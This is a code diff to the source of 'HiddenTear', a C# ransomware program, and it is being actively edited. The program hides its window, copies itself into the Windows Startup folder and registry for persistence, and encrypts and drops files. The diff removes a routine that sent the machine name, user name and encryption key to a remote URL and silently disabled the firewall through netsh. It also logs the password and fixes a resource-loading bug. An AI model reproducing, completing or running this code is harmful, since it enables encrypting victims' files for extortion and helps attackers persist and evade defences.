@@ -23,13 +23,6 @@ namespace HiddenTear
         }
         private void Form1_Load(object sender, EventArgs e)
         {
-            string password = createPassword(Settables.PASSLENGTH);
-            Common.Log("password is : " + password);
-                //string thisPath = Assembly.GetEntryAssembly().Location;
-                //byte[] thisExe = File.ReadAllBytes(thisPath);
-                //dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe", thisExe);
-                //addToStartupRegistry("Crypt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe");
-
             Opacity = 0;
             this.ShowInTaskbar = false;
             startAction();
@@ -45,9 +38,11 @@ namespace HiddenTear
 
         void startAction()
         {
-            Common.Log("Sequence started!");
             string password = createPassword(Settables.PASSLENGTH);
-            string thisPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
+            Common.Log("password is : " + password);
+            Common.Log("Sequence started!");
+
+            string thisPath = Assembly.GetEntryAssembly().Location;
             byte[] thisExe = File.ReadAllBytes(thisPath);
             dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe", thisExe);
             addToStartupRegistry("Crypt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe");
@@ -87,7 +82,7 @@ namespace HiddenTear
 
 
             dropFiles();
-            if (Settables.URL != "") sendPassword(password);
+            Common.Log("Encryption completed!");
             password = null;
             System.Windows.Forms.Application.Exit();
         }
@@ -231,51 +226,6 @@ namespace HiddenTear
             return encryptedBytes;
         }
 
-        void sendPassword(string password)
-        {
-            if (string.IsNullOrEmpty(Settables.URL)) return;
-            string info = Environment.MachineName + "-" +
-                            Environment.UserName + " " +
-                            password;
-            var fullUrl = Settables.URL + info;
-
-            using (System.Net.WebClient client = new System.Net.WebClient())
-            {
-                string testie = "";
-                try
-                {
-                    testie = client.DownloadString("google.com");
-                }
-                catch { }
-
-                if (!string.IsNullOrEmpty(testie))
-                {
-                    try
-                    {
-                        var content = client.DownloadString(fullUrl);
-                    }
-                    catch { }
-                }
-                else
-                {
-                    try
-                    {
-                        System.Diagnostics.Process process = new System.Diagnostics.Process();
-                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
-                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-                        startInfo.FileName = "cmd.exe";
-                        startInfo.Arguments = "netsh firewall set opmode disable";
-                        process.StartInfo = startInfo;
-                        process.Start();
-
-                        process.WaitForExit();
-
-                        var content = client.DownloadString(fullUrl);
-                    }
-                    catch { }
-                }
-            }
-        }
         void dropFiles()
         {
             if (crypted.Count < 1) return;
@@ -318,7 +268,7 @@ namespace HiddenTear
         static byte[] getEmbeddedResource(string fullName)
         {
             byte[] decryptorBuffer = default(byte[]);
-            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("fullName");
+            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(fullName);
             using (var memstream = new MemoryStream())
             {
                 stream.CopyTo(memstream);
